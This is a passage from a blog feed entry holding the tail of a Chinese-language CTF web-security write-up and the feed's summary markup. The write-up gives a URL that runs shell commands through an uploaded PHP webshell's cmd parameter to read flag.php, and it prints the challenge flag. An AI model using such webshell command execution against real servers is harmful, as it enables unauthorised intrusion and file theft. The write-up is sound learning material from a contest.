alt><br>可以看到我们的命令被成功执行了<br>ok，接下来就是寻找flag的位置和查看flag了，直接给出payload<br><code>http://114.55.36.69:8014/upload/8a30ec6807f71bc69d096d8e4d501ade/u.php?cmd=cd%20..;cd%20..;cat%20flag.php</code><br>回车后页面是空的，因为php代码是不会显示出来的<br>查看页面源代码就能看到内容了<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/13.png" alt><br>    flag{N4me_sPac4_Is_Int3r3st1ng}</p></blockquote><p>由于时间有限，只写出来了7个题，剩下3个300分的还没看。2333333</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-Input&quot;&gt;&lt;a href=&quot;#1-Input&quot; class=&quot;headerlink&quot; title=&quot;1. Input&quot;&gt;&lt;/a&gt;1. Input&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;http://114.55.36.69:8003/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://114.55.36.69:8003/&lt;/a&gt;&lt;br&gt;进去后一个输入框，一个提交&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://black0saturday.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
